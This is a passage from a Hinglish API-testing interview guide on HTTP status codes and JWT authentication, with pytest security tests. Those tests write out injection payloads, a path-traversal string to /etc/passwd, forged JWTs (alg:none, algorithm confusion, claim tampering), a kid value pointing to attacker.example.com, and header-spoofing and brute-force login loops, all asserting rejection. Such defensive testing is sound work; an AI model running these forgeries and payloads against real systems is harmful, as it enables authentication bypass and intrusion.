> test that, I don't just check the status: I assert that the cross-org response and the
> genuinely-nonexistent response are byte-identical, and I compare median response times,
> because a status code that matches but a latency that doesn't is still an oracle."

> **Cross-question: "Isn't hiding behind 404 bad developer experience?"**
>
> "It is, and that's the real trade-off. My mitigation is that the response body carries a
> stable machine-readable error code and a correlation id, so a legitimate developer hitting
> a genuine 404 can quote that id to support, and support can look at the logs and see whether
> it was 'doesn't exist' or 'not yours'. The distinction stays available to the people
> entitled to it, without being broadcast in the response. And I'd only apply it to
> cross-tenant boundaries — within a tenant, where users already see the resource listed, 403
> with a clear message is better."

## 4.5 Deep dive — 409 Conflict

### Kya hai

409 ka matlab: "Request valid hai, lekin **resource ki current state** ke saath conflict
karti hai." Ye 400 se alag hai — 400 kehta hai request kharab hai, 409 kehta hai *timing*
ya *state* kharab hai.

### Teen main use cases

**1. Duplicate creation / uniqueness violation**

```python
def test_duplicate_carve_on_same_scope_returns_409(api, budget_id, scope_id):
    payload = {"scopeId": scope_id, "amount": 250000, "currency": "INR"}
    first = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)
    assert first.status_code == 201

    second = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)
    assert second.status_code == 409, (
        f"Duplicate carve pe {second.status_code} — "
        "500 aaya to raw DB exception leak ho raha hai, "
        "201 aaya to duplicate financial record ban gaya"
    )
    # Error machine-readable hona chahiye taaki client handle kar sake
    assert second.json().get("code") in ("SCOPE_ALREADY_CARVED", "DUPLICATE_CARVE")
```

**2. Concurrency — do requests ek saath**

> **[REAL]** Merlin ka carve endpoint ye correctly karta hai. Maine ThreadPoolExecutor se
> do concurrent carves same scope pe bheje — exactly ek ko `201` mila, doosre ko `409`.
> Ye application-level check se nahi, **DB-level unique partial index** se enforce hota
> hai. Ye important distinction hai: application mein "pehle check karo, phir insert karo"
> likhne pe check aur insert ke beech ek race window hota hai jismein dono requests check
> pass kar leti hain.

**3. State machine violation**

```python
@pytest.mark.parametrize("current_state,action,expected", [
    ("OPEN",      "close",  200),
    ("CLOSED",    "close",  409),   # already closed
    ("CANCELLED", "close",  409),   # terminal state
    ("DRAFT",     "close",  409),   # not yet open
])
def test_sale_state_machine(api, current_state, action, expected, sale_in_state):
    """State machine ko exhaustively test karo — har state x har action.
    Invalid transition 409 deni chahiye, 400 nahi (request theek hai, state galat hai)
    aur definitely 200 nahi (silently no-op sabse bura hai)."""
    sale_id = sale_in_state(current_state)
    r = api.post(f"/api/v1/sales/{sale_id}/{action}")
    assert r.status_code == expected

    if expected == 409:
        # Aur verify karo ki state actually badla NAHI
        after = api.get(f"/api/v1/sales/{sale_id}").json()
        assert after["status"] == current_state, "409 diya lekin state phir bhi badal gaya"
```

**409 vs 412 — cross-question:**

| | 409 Conflict | 412 Precondition Failed |
|---|---|---|
| Trigger | Server ne apni state check ki | Client ne `If-Match` bheja tha aur wo match nahi hua |
| Client ne kya bheja | Normal request | Conditional header |
| Matlab | "Ye aur current state saath nahi rah sakte" | "Tumhara version purana hai" |

## 4.6 Deep dive — 422 vs 400

Ye subtle hai aur senior interview mein aata hai.

| | 400 Bad Request | 422 Unprocessable Entity |
|---|---|---|
| Problem kahan | **Syntax** — parse hi nahi hua | **Semantics** — parse ho gaya, matlab galat hai |
| Example | Malformed JSON, `Content-Length` mismatch, wrong type where parser dies | `amount: -500` (negative), `endDate < startDate`, valid email format jo exist nahi karta |
| Server kya kar paya | Body samajh hi nahi paya | Body samajh liya, business rules fail hue |
| Spec | RFC 9110 (core HTTP) | RFC 4918 (WebDAV se aaya), ab REST mein widely used |

```python
# 400 ke cases — server body parse hi nahi kar sakta
'{"amount": 250000,}'          # trailing comma -> parser fail
'{"amount": "abc"}'            # string jahan number expected -> deserialization fail
''                             # empty body
'not json at all'

# 422 ke cases — parse ho gaya, business rules fail
{"amount": -250000}            # negative amount
{"amount": 0}                  # zero carve meaningless
{"startDate": "2026-12-01", "endDate": "2026-01-01"}   # end before start
{"amount": 999999999, "scopeId": "sc_1"}               # budget se zyada
{"currency": "XYZ"}            # valid string, invalid currency code
```

**Practical reality:** bahut saari APIs sab kuch 400 deti hain. **Ye acceptable hai** agar
consistent ho aur error body mein field-level detail ho. Sabse bura scenario hai
**inconsistency** — kabhi 400, kabhi 422, kabhi 500, same class ke error pe.

```python
@pytest.mark.parametrize("payload,reason", [
    ({"scopeId": "sc_1", "amount": -100},        "negative amount"),
    ({"scopeId": "sc_1", "amount": 0},           "zero amount"),
    ({"scopeId": "sc_1", "amount": 99999999999}, "exceeds budget"),
    ({"scopeId": "sc_1", "amount": 100, "currency": "XYZ"}, "invalid currency"),
    ({"scopeId": "nonexistent", "amount": 100},  "unknown scope"),
])
def test_semantic_validation_is_consistent_and_field_scoped(api, budget_id, payload, reason):
    """Sabse important yahan CONSISTENCY hai, exact code nahi.
    Aur error mein batana chahiye KAUNSA field galat hai —
    warna frontend field ke neeche error nahi dikha sakta."""
    r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)

    assert r.status_code in (400, 422), f"{reason}: got {r.status_code}"
    assert r.status_code != 500, f"{reason}: 500 — validation missing hai"

    body = r.json()
    # Machine-readable error code hona chahiye, sirf English message nahi
    assert "code" in body or "errors" in body, \
        f"{reason}: error body machine-readable nahi — client isse handle nahi kar sakta"
    # Field-level pointer
    assert any(k in json.dumps(body) for k in ("field", "path", "pointer", "param")), \
        f"{reason}: kaunsa field galat hai ye nahi bataya"


def test_all_validation_errors_returned_at_once(api, budget_id):
    """Fail-fast validation bura UX hai — user ek error fix karta hai,
    submit karta hai, agla error aata hai. Saare errors ek saath aane chahiye."""
    r = api.post(f"/api/v1/budgets/{budget_id}/carve",
                 json={"amount": -100, "currency": "XYZ"})   # scopeId missing bhi hai
    body = r.json()
    errors = body.get("errors", [])
    assert len(errors) >= 3, (
        f"Sirf {len(errors)} errors mile — 3 problems hain (missing scopeId, "
        "negative amount, invalid currency). Fail-fast validation hai."
    )
```

## 4.7 Deep dive — 429 Too Many Requests

### Kya hai

Client ne rate limit cross kar diya.

**Response mein ye headers hone chahiye:**

```http
HTTP/1.1 429 Too Many Requests
Retry-After: 30
RateLimit-Limit: 100
RateLimit-Remaining: 0
RateLimit-Reset: 1755925200
```

`Retry-After` do formats mein aa sakta hai:
- Seconds: `Retry-After: 30`
- HTTP date: `Retry-After: Sat, 23 Aug 2026 05:00:00 GMT`

**Dono handle karna client ki zimmedari hai — aur ye ek test-worthy edge case hai.**

```python
import time
from email.utils import parsedate_to_datetime
from datetime import datetime, timezone


def parse_retry_after(value: str) -> float:
    """Retry-After dono formats support karta hai. Framework mein dono handle karo."""
    if value.isdigit():
        return float(value)
    dt = parsedate_to_datetime(value)
    return max(0.0, (dt - datetime.now(timezone.utc)).total_seconds())


@pytest.mark.slow
def test_rate_limit_returns_429_with_retry_after(api):
    """Rate limit test karne ka sahi tareeka: burst bhejo jab tak 429 na aaye,
    phir headers verify karo, phir Retry-After ke baad recovery verify karo."""
    responses = []
    for _ in range(200):
        r = api.get("/api/v1/projects/p_1/sales", raise_on_status=False)
        responses.append(r)
        if r.status_code == 429:
            break

    limited = [r for r in responses if r.status_code == 429]
    assert limited, "200 requests mein rate limit nahi laga — kya rate limiting hai bhi?"

    r429 = limited[0]
    assert "Retry-After" in r429.headers, (
        "429 bina Retry-After ke — client ko pata nahi kab retry kare, "
        "wo aggressive retry karega aur problem badhayega"
    )

    wait = parse_retry_after(r429.headers["Retry-After"])
    assert 0 < wait <= 3600, f"Retry-After absurd hai: {wait}s"

    # Recovery verify karo
    time.sleep(wait + 1)
    after = api.get("/api/v1/projects/p_1/sales", raise_on_status=False)
    assert after.status_code == 200, (
        f"Retry-After ke baad bhi {after.status_code} — window kabhi reset hi nahi hoti"
    )


@pytest.mark.security
def test_rate_limit_is_per_identity_not_global(api, token_a, token_b):
    """Sabse important rate-limit bug: limit global hai, per-user nahi.
    Matlab ek user (ya attacker) poore system ko rate-limit kar sakta hai —
    ye ek DoS vector hai."""
    # User A ko exhaust karo
    for _ in range(200):
        r = requests.get(f"{BASE_URL}/api/v1/projects/p_1/sales",
                         headers={"Authorization": f"Bearer {token_a}"}, timeout=30)
        if r.status_code == 429:
            break
    assert r.status_code == 429, "A exhaust nahi hua"

    # B abhi bhi kaam karna chahiye
    rb = requests.get(f"{BASE_URL}/api/v1/projects/p_1/sales",
                      headers={"Authorization": f"Bearer {token_b}"}, timeout=30)
    assert rb.status_code == 200, (
        "User A ke rate limit ne User B ko bhi block kar diya — "
        "global rate limiting hai, ye DoS vector hai"
    )


@pytest.mark.security
def test_rate_limit_not_bypassable_via_forwarded_header(api):
    """Agar rate limiting X-Forwarded-For pe based hai, attacker
    har request pe random IP bhej ke bypass kar sakta hai."""
    codes = []
    for i in range(200):
        r = requests.get(f"{BASE_URL}/api/v1/auth/login",
                         headers={"X-Forwarded-For": f"10.0.{i // 256}.{i % 256}"},
                         json={"email": "a@b.com", "password": "wrong"}, timeout=30)
        codes.append(r.status_code)
    assert 429 in codes, (
        "X-Forwarded-For spoof karke rate limit bypass ho gaya — "
        "brute force protection useless hai"
    )
```

**Sabse important rate limit test — login endpoint:**

```python
@pytest.mark.security
def test_login_has_brute_force_protection(api):
    """Login pe rate limit / lockout na hona sabse serious findings mein se hai."""
    codes = []
    for _ in range(50):
        r = requests.post(f"{BASE_URL}/api/v1/auth/login",
                          json={"email": "ritik.chaturvedi@merlinai.co", "password": f"wrong"},
                          timeout=30)
        codes.append(r.status_code)
    assert 429 in codes or 423 in codes, (
        "50 failed logins bina kisi throttling ke — credential stuffing possible"
    )
```

## 4.8 Deep dive — 5xx

### Har 5xx ek bug hai

Ye principle interview mein clearly bolna chahiye. 4xx client ki galti hai — expected. 5xx
server ki galti hai — **koi bhi client input server ko 500 nahi de paana chahiye**.

**Malformed input pe 500 ka matlab hai:**
1. Input validation missing hai
2. Unhandled exception hai
3. Aur usually — **error message mein internal detail leak hoti hai**

> **[REAL]** Merlin ka sabse serious bug isi class ka tha. Ek **public, unauthenticated
> accept endpoint** ne `HTTP 400` return kiya jiske error message mein **raw Mongo query**
> thi — including org ka ObjectId aur ek internal `$java ... LazyLoadingProxy` dump. Ye
> information disclosure hai: attacker ko internal data model, org identifier, aur ORM stack
> ka pata chal gaya, bina login kiye.
>
> Root cause aur bhi batane layak hai: repository method thi
> `findByOrgAndEmailAddress(...): Optional<CustomerContact>`. `Optional` ka matlab hai
> "at most one result". Lekin `(org, emailAddress)` pe **koi uniqueness constraint nahi
> tha**. Jab duplicate contacts exist kiye, Spring Data ne
> `IncorrectResultSizeDataAccessException` throw kiya, aur uska message mein poori query
> chali gayi.
>
> **Ye do alag bugs hain jo ek saath dikhe:**
> 1. **Data integrity:** code ne uniqueness assume ki jo DB mein enforce nahi thi
> 2. **Information disclosure:** internal exception message client tak leak hua, wo bhi ek public endpoint pe

```python
@pytest.mark.security
@pytest.mark.parametrize("field_value", [
    None, "", " ", "a" * 10000,
    "'; DROP TABLE users; --",
    '{"$ne": null}',                       # NoSQL injection — Mongo mein serious
    '{"$gt": ""}',
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "\x00\x01\x02",                        # null bytes
    "😀🔥",                                 # unicode / emoji
    "AAAA" * 1000,
])
def test_public_endpoint_never_leaks_internals(field_value):
    """[REAL bug ka regression test]
    Ye test us exact bug ko pakadta jo Merlin mein mila tha.
    Public endpoint hai — auth ke bina hit ho sakta hai — isliye
    error surface ekdum saaf hona chahiye."""
    r = requests.post(f"{BASE_URL}/api/v1/public/offers/accept",
                      json={"emailAddress": field_value, "offerToken": "tok_abc"},
                      timeout=30)

    body = r.text.lower()

    # Ye tokens KABHI client tak nahi jaane chahiye
    leaks = [
        "$java",                    # Mongo BSON java type marker
        "lazyloadingproxy",         # Spring Data internal proxy
        "objectid(",                # raw Mongo ObjectId
        "com.merlin",               # internal package names
        "org.springframework",
        "incorrectresultsize",      # exception class name
        "dataaccessexception",
        "caused by",                # stack trace
        "\tat ",
        "mongotemplate",
        "select ", "from ", "where ",   # raw query fragments
        "nullpointerexception",
    ]
    found = [tok for tok in leaks if tok in body]
    assert not found, (
        f"Input {field_value!r} pe internal detail leak: {found}\n"
        f"Response: {r.text[:600]}"
    )

    # Aur 500 bhi nahi aana chahiye
    assert r.status_code < 500, f"Input {field_value!r} pe {r.status_code}"


@pytest.mark.security
def test_duplicate_contacts_do_not_crash_lookup(api, org_id):
    """[REAL root cause ka test]
    Repository ne Optional<T> assume kiya but uniqueness constraint nahi tha.
    Ye test data-level setup se us assumption ko todta hai."""
    email = f"dup-{uuid.uuid4().hex[:8]}@example.com"
    # Deliberately do contacts same email se banao
    c1 = api.post("/api/v1/customer-contacts", json={"emailAddress": email, "name": "A"})
    c2 = api.post("/api/v1/customer-contacts", json={"emailAddress": email, "name": "B"})

    if c2.status_code == 409:
        # Ab uniqueness enforce ho rahi hai — bug fix ho gaya, ye acceptable outcome hai
        return

    assert c2.status_code == 201, "Setup nahi ho paya"

    # Ab wo endpoint hit karo jo findByOrgAndEmailAddress use karta hai
    r = requests.post(f"{BASE_URL}/api/v1/public/offers/accept",
                      json={"emailAddress": email, "offerToken": "tok_abc"}, timeout=30)
    assert r.status_code != 500, "Duplicate contacts ne endpoint crash kar diya"
    assert "incorrectresultsize" not in r.text.lower()
```

### 500 vs 502 vs 503 vs 504 — kaise distinguish karein

```
500 Internal Server Error
  -> APP ne exception throw kiya. App logs mein stack trace milega.
     Aapka correlation id logs mein hoga.

502 Bad Gateway
  -> LOAD BALANCER/PROXY ko upstream se garbage mila (ya connection refused).
     App logs mein SHAYAD kuch nahi hoga — request app tak pahunchi hi nahi,
     ya app crash ho gaya response likhne se pehle.
     Common cause: app process restart ke dauraan, ya OOM kill.

503 Service Unavailable
  -> Service jaan-boojh ke keh raha hai "abhi nahi".
     Deploy ke dauraan, maintenance mode, ya circuit breaker open.
     Retry-After hona chahiye.

504 Gateway Timeout
  -> Upstream ne time pe jawab nahi diya.
     Agar exactly 30.00s ya 60.00s pe aata hai -> ye PROXY timeout hai,
     app abhi bhi kaam kar raha ho sakta hai (aur DB write complete kar sakta hai!)
```

**504 ka sabse khatarnaak side-effect** — ye ek excellent interview point hai:

```python
def test_gateway_timeout_does_not_cause_duplicate_side_effect(api, budget_id):
    """504 ka matlab hai 'jawab nahi mila' — 'kaam nahi hua' NAHI.
    Client retry karta hai, aur agar operation idempotent nahi hai
    to do carves ban jaate hain.
    Isliye har slow non-idempotent operation ko Idempotency-Key chahiye."""
    key = str(uuid.uuid4())
    payload = {"scopeId": "sc_slow", "amount": 250000}

    # Pehli call — deliberately chhota timeout, client side pe timeout hoga
    try:
        api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload,
                 headers={"Idempotency-Key": key}, timeout=0.5)
    except requests.exceptions.Timeout:
        pass    # exactly ye simulate karna tha

    # Client retry karta hai same key ke saath
    retry = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload,
                     headers={"Idempotency-Key": key}, timeout=60)
    assert retry.status_code in (200, 201)

    # Verify: sirf EK carve bana
    coverage = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
    carves = [c for c in coverage["carves"] if c["scopeId"] == "sc_slow"]
    assert len(carves) == 1, (
        f"{len(carves)} carves ban gaye — timeout + retry ne duplicate bana diya. "
        "Idempotency-Key honour nahi ho rahi."
    )
```

> **Interview answer (status codes overall):**
>
> "I treat the status code as the weakest assertion in any API test. It's necessary but never
> sufficient, and I have a concrete reason for saying that: at Merlin, a customer-facing
> endpoint returned a clean 200 with `totalPrice: null` and an empty `lineItems` array for a
> contract that had a real signed value. The status was perfect and the data was completely
> wrong. The reader was only looking at the estimate entity, while the frozen price actually
> lived on the Sale entity. So my assertion ladder goes status, then content type, then
> schema, then business values, then side effects, then non-effects — and the last three are
> where the real bugs live.
>
> Where status codes do matter is as a contract for client behaviour. 401 versus 403 decides
> whether a client refreshes its token. 409 versus 400 decides whether retrying later could
> ever help. 429 with `Retry-After` decides whether a client backs off politely or hammers
> you harder. Those aren't stylistic choices; getting them wrong produces real production
> failures.
>
> And my hard rule is that every 5xx is a bug until proven otherwise. No client input should
> be able to make the server throw. That's not just about availability — the same
> unhandled-exception path is usually what leaks internals. The most serious bug I found at
> Merlin was exactly this shape: a public unauthenticated endpoint returned a 400 whose
> message contained the raw Mongo query, including the org ObjectId and an internal
> `LazyLoadingProxy` dump. Two bugs stacked on top of each other — a data integrity problem,
> because the repository method returned `Optional` and so assumed at most one result while
> the database had no uniqueness constraint on org plus email address, and an information
> disclosure problem, because the resulting
> `IncorrectResultSizeDataAccessException` message was passed straight through to an
> unauthenticated caller."

> **Cross-question: "A 504 came back. Did the operation happen?"**
>
> "You don't know, and that's the whole point. A gateway timeout means the response didn't
> arrive in time — it says nothing about whether the server finished the work. The database
> write may well have committed after the proxy gave up. So the client retries, and if the
> operation isn't idempotent, you now have two budget carves for the same scope, which in a
> construction ERP means the accounting is wrong. That's why every slow, non-idempotent
> operation needs either an idempotency key or a database-level uniqueness constraint. I test
> it by deliberately timing out the client on the first call and retrying with the same
> idempotency key, then asserting the resource was created exactly once — not by trusting the
> status codes, but by reading the state back."

---

# PART 5 — Authentication & Authorization

## 5.0 Do alag cheezein — pehle ye clear karo

| | Authentication (AuthN) | Authorization (AuthZ) |
|---|---|---|
| Sawaal | **Tum kaun ho?** | **Tum kya kar sakte ho?** |
| Kab | Pehle | Baad mein |
| Fail hone pe | 401 | 403 (ya 404 agar existence hide karni hai) |
| Kahan implement hota | Usually ek jagah — filter/middleware | **Har endpoint pe, har resource pe** |
| Bug kahan milte hain | Kam — ek jagah hai to ek baar theek ho jaata hai | **Bahut zyada** — har naya endpoint ek naya chance |

**Ye sabse important insight hai auth testing ka:**

> Authentication ek **centralized** concern hai — ek filter, sab endpoints cover. Isliye
> authentication bugs kam hote hain.
>
> Authorization **distributed** hai — har controller method, har resource, har field. Isliye
> **90% real auth bugs authorization bugs hote hain**, authentication bugs nahi.
>
> Phir bhi zyadatar QA sirf "token ke bina 401 aata hai" test karta hai — wo authentication
> hai. Asli bugs doosri taraf hain.

> **[REAL]** Merlin ka backend mein **57 passing integration tests** the — token forgery,
> replay, expiry, cross-org, sab cover the. Aur end-to-end flow phir bhi toota hua tha.
> Kyun? Kyunki **har test apna token khud mint karta tha aur apna customerId khud pass
> karta tha**. Har test ne apna hi setup verify kiya. Jo cheez kabhi test nahi hui wo thi:
> real flow mein token kis se banta hai, aur us token ka customerId us se match karta hai
> ya nahi jo endpoint expect karta hai. **Integration seams kabhi test nahi hue.**

## 5.1 Basic Authentication

### Kya hai

Sabse purana scheme. Username aur password ko `:` se join karke **base64 encode** karo.

```python
import base64

creds = base64.b64encode(b"ritik:secretpassword").decode()
# "cml0aWs6c2VjcmV0cGFzc3dvcmQ="

headers = {"Authorization": f"Basic {creds}"}
```

```python
# requests mein shortcut
r = requests.get(url, auth=("ritik", "secretpassword"), timeout=30)
```

### Kyun problematic hai

**Base64 encryption nahi hai — encoding hai.** Koi bhi decode kar sakta hai:

```python
base64.b64decode("cml0aWs6c2VjcmV0cGFzc3dvcmQ=")
# b'ritik:secretpassword'
```

Matlab:
- **Har request pe** plaintext password wire pe jaata hai. HTTPS ke bina = fully exposed.
- Password client mein store karna padta hai (session ke liye)
- Revoke karne ka koi tareeka nahi — password badalne ke alawa
- Expiry nahi hai
- MFA support nahi

### Kab abhi bhi theek hai

- Internal service-to-service, private network mein
- CI/CD tools ka simple auth
- Legacy systems

### QA tests

```python
@pytest.mark.security
def test_basic_auth_only_over_https():
    """HTTP pe Basic auth = password plaintext. Server ko HTTP request
    redirect ya reject karni chahiye, credentials accept nahi karni chahiye."""
    r = requests.get("http://staging.merlinai.co/api/v1/sales/s_1",
                     auth=("ritik", "pw"), allow_redirects=False, timeout=30)
    assert r.status_code in (301, 308, 400, 403), \
        "HTTP pe Basic auth accept ho raha hai — password plaintext jaa raha hai"


@pytest.mark.security
def test_basic_auth_401_includes_www_authenticate():
    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1", timeout=30)
    assert r.status_code == 401
    assert "WWW-Authenticate" in r.headers


@pytest.mark.security
@pytest.mark.parametrize("header_value", [
    "Basic",                              # scheme without credentials
    "Basic ",
    "Basic !!!not-base64!!!",
    "Basic " + base64.b64encode(b"nocolon").decode(),   # colon missing
    "Basic " + base64.b64encode(b"a:" + b"x" * 100000).decode(),  # huge password
    "basic " + base64.b64encode(b"ritik:pw").decode(),  # lowercase scheme
])
def test_malformed_basic_auth_returns_401_not_500(header_value):
    """Malformed auth header pe 500 = unhandled exception in the auth filter.
    Ye ek unauthenticated code path hai — sabse pehle test karo."""
    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                     headers={"Authorization": header_value}, timeout=30)
    assert r.status_code in (400, 401), f"Got {r.status_code} for {header_value[:40]}"
```

## 5.2 Bearer tokens / JWT — full anatomy

### Kya hai

JWT = **JSON Web Token**. Ek self-contained, signed token. Teen base64url-encoded parts,
`.` se joined:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  .  eyJzdWIiOiJ1XzEyMyIsIm9yZyI6Im9yZ180NCJ9  .  k3KxN9dQ...
└─────────── HEADER ──────────────┘     └─────────── PAYLOAD ─────────────────┘    └─ SIGNATURE ─┘
```

### Part 1 — Header

```json
{
  "alg": "HS256",       // signing algorithm
  "typ": "JWT",
  "kid": "key-2026-08"  // key id — kaunsi key se sign hua (key rotation ke liye)
}
```

### Part 2 — Payload (claims)

```json
{
  "sub": "u_123",                    // subject — kaun (user id)
  "iss": "https://auth.merlinai.co", // issuer — kisne banaya
  "aud": "merlin-api",               // audience — kiske liye hai
  "exp": 1755928800,                 // expiry (unix seconds)
  "iat": 1755925200,                 // issued at
  "nbf": 1755925200,                 // not before
  "jti": "3f9a1c22-77bd-4a0e",       // JWT ID — replay detection ke liye unique id

  // custom claims
  "org": "org_44",
  "roles": ["SALES_MANAGER"],
  "email": "ritik.chaturvedi@merlinai.co"
}
```

**Registered claims yaad rakho:** `iss`, `sub`, `aud`, `exp`, `nbf`, `iat`, `jti`.

### Part 3 — Signature

```
HMACSHA256(
  base64url(header) + "." + base64url(payload),
  secret
)
```

### Decode karke dekho — koi secret nahi chahiye

Ye sabse important practical baat hai:

```python
import base64, json

def decode_jwt_unsafe(token: str) -> dict:
    """JWT ka payload padhne ke liye secret ki ZAROORAT NAHI hai.
    Ye sirf base64 hai — encryption nahi. Har koi padh sakta hai.
    Isliye JWT payload mein KABHI secret mat daalo."""
    header_b64, payload_b64, signature = token.split(".")

    def b64url_decode(s):
        s += "=" * (-len(s) % 4)          # padding add karo
        return base64.urlsafe_b64decode(s)

    return {
        "header": json.loads(b64url_decode(header_b64)),
        "payload": json.loads(b64url_decode(payload_b64)),
        "signature": signature,
    }


# Test mein ye bahut kaam aata hai
decoded = decode_jwt_unsafe(token)
print(decoded["payload"]["org"])    # kaunsa org token mein hai
print(decoded["payload"]["exp"])    # kab expire hoga
```

### Payload mein kya daalna SAFE hai, kya nahi

| Safe | Unsafe |
|---|---|
| user id (`sub`) | Password, password hash |
| org/tenant id | API keys, secrets |
| roles / permissions | Credit card, PAN, Aadhaar |
| email (agar sensitive na ho) | Full address, phone (PII) |
| expiry, issuer, audience | Internal DB primary keys jo enumerable hon |
| display name | Anything you wouldn't put on a postcard |

**Rule:** JWT payload ko aisa treat karo jaise wo **public** hai. Kyunki practically hai.

```python
@pytest.mark.security
def test_jwt_payload_has_no_secrets(logged_in_token):
    """Token ka payload decode karke check karo ki koi sensitive cheez to nahi hai.
    Ye test 30 second mein likh jaata hai aur real findings deta hai."""
    payload = decode_jwt_unsafe(logged_in_token)["payload"]
    flat = json.dumps(payload).lower()

    forbidden_keys = {"password", "passwordhash", "secret", "apikey", "api_key",
                      "ssn", "pan", "aadhaar", "creditcard", "cardnumber", "cvv",
                      "privatekey", "salt"}
    present = forbidden_keys & {k.lower() for k in payload}
    assert not present, f"JWT payload mein sensitive claims: {present}"

    # Value-level check bhi — kabhi key ka naam innocent hota hai
    assert "bcrypt" not in flat and "$2a$" not in flat, "Password hash payload mein hai"
    assert len(json.dumps(payload)) < 4096, (
        "JWT bahut bada hai — har request pe jaata hai, aur HTTP/2 header limits "
        "cross karke 431 de sakta hai"
    )
```

### Tampering kaise detect hoti hai

```
Attacker payload badalta hai:
  {"sub":"u_123","roles":["VIEWER"]}  ->  {"sub":"u_123","roles":["ADMIN"]}

Naya base64 banata hai. Lekin signature purane payload ka hai.

Server verify karta hai:
  expected = HMACSHA256(new_header + "." + new_payload, SERVER_SECRET)
  received = purani signature

  expected != received  ->  401 Invalid token

Attacker naya valid signature nahi bana sakta kyunki SERVER_SECRET uske paas nahi hai.
```

### JWT ke classic attacks — aur unke tests

**Attack 1: `alg: none`**

Original JWT spec mein `"alg": "none"` allowed tha — matlab "no signature". Kuch libraries
isko accept kar leti hain. Attacker signature hata deta hai aur `alg` ko `none` kar deta hai.

```python
@pytest.mark.security
def test_alg_none_token_is_rejected(valid_token):
    """Classic JWT attack. Library agar 'none' accept karti hai,
    to koi bhi apna token bana sakta hai."""
    parts = valid_token.split(".")
    payload = json.loads(b64url_decode(parts[1]))
    payload["roles"] = ["ADMIN"]

    header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    body = b64url_encode(json.dumps(payload).encode())
    forged = f"{header}.{body}."          # signature khaali

    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                     headers={"Authorization": f"Bearer {forged}"}, timeout=30)
    assert r.status_code == 401, "alg:none token accept ho gaya — complete auth bypass"
```

**Attack 2: Algorithm confusion (RS256 → HS256)**

Agar server RS256 (asymmetric) use karta hai, uski **public key public hai**. Attacker
`alg` ko HS256 (symmetric) mein badal deta hai aur **public key ko HMAC secret ki tarah**
use karke sign kar deta hai. Agar server blindly header ka `alg` maanta hai, wo public key
se verify karega — aur pass ho jayega.

```python
@pytest.mark.security
def test_algorithm_confusion_rs256_to_hs256(valid_rs256_token, server_public_key_pem):
    """Server ko algorithm HARDCODE karna chahiye, token ke header se nahi lena chahiye.
    'alg' attacker-controlled input hai."""
    import hmac, hashlib
    parts = valid_rs256_token.split(".")
    payload = json.loads(b64url_decode(parts[1]))
    payload["roles"] = ["ADMIN"]

    header = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    body = b64url_encode(json.dumps(payload).encode())
    signing_input = f"{header}.{body}".encode()
    sig = hmac.new(server_public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    forged = f"{header}.{body}.{b64url_encode(sig)}"

    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                     headers={"Authorization": f"Bearer {forged}"}, timeout=30)
    assert r.status_code == 401, "Algorithm confusion attack safal — privilege escalation"
```

**Attack 3: Signature stripping / bit flipping**

```python
@pytest.mark.security
@pytest.mark.parametrize("mutate,name", [
    (lambda t: ".".join(t.split(".")[:2]) + ".",              "signature removed"),
    (lambda t: t[:-1] + ("a" if t[-1] != "a" else "b"),        "last char flipped"),
    (lambda t: ".".join(t.split(".")[:2]) + ".AAAA",           "garbage signature"),
    (lambda t: t.split(".")[0] + "." + t.split(".")[1],        "only two parts"),
    (lambda t: t + "extra",                                    "appended junk"),
    (lambda t: t.replace(".", ""),                             "dots removed"),
    (lambda t: "",                                             "empty token"),
    (lambda t: "Bearer " + t,                                  "double Bearer prefix"),
])
def test_tampered_tokens_rejected(valid_token, mutate, name):
    """Har mutation pe 401 aana chahiye. 500 = auth filter mein unhandled exception,
    aur wo ek unauthenticated code path hai."""
    tampered = mutate(valid_token)
    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                     headers={"Authorization": f"Bearer {tampered}"}, timeout=30)
    assert r.status_code == 401, f"{name}: got {r.status_code}"
```

**Attack 4: Claim tampering — payload badalna**

```python
@pytest.mark.security
@pytest.mark.parametrize("claim,new_value,what", [
    ("roles", ["ADMIN"],                    "privilege escalation"),
    ("org",   "org_OTHER",                  "cross-tenant access"),
    ("sub",   "u_999",                      "identity spoofing"),
    ("exp",   9999999999,                   "expiry extension"),
    ("aud",   "some-other-api",             "audience confusion"),
])
def test_claim_tampering_rejected(valid_token, claim, new_value, what):
    """Payload badalne se signature invalid ho jaati hai — 401 aana chahiye.
    Ye 5 tests aapke 'security testing' claim ko concrete banate hain."""
    parts = valid_token.split(".")
    payload = json.loads(b64url_decode(parts[1]))
    payload[claim] = new_value
    forged = f"{parts[0]}.{b64url_encode(json.dumps(payload).encode())}.{parts[2]}"

    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                     headers={"Authorization": f"Bearer {forged}"}, timeout=30)
    assert r.status_code == 401, f"{what} succeeded — signature verify nahi ho rahi"
```

**Attack 5: `kid` header injection**

`kid` (key id) batata hai kaunsi key use karni hai. Agar server isko blindly file path ya
SQL query mein daalta hai — path traversal / SQL injection.

```python
@pytest.mark.security
@pytest.mark.parametrize("kid", [
    "../../../../dev/null",
    "/dev/null",
    "' UNION SELECT 'secret' --",
    "http://attacker.example.com/key.json",
])
def test_kid_header_injection(valid_token, kid):
    parts = valid_token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    header["kid"] = kid
    forged = f"{b64url_encode(json.dumps(header).encode())}.{parts[1]}.{parts[2]}"
    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                     headers={"Authorization": f"Bearer {forged}"}, timeout=30)
    assert r.status_code == 401, f"kid injection '{kid}' pe {r.status_code}"
```

### Expiry testing

```python
import jwt as pyjwt   # PyJWT library — test tokens banane ke liye

def make_token(exp_offset_seconds: int, secret: str = TEST_SECRET, **claims) -> str:
    """Test tokens banane ka helper — expiry scenarios ke liye.
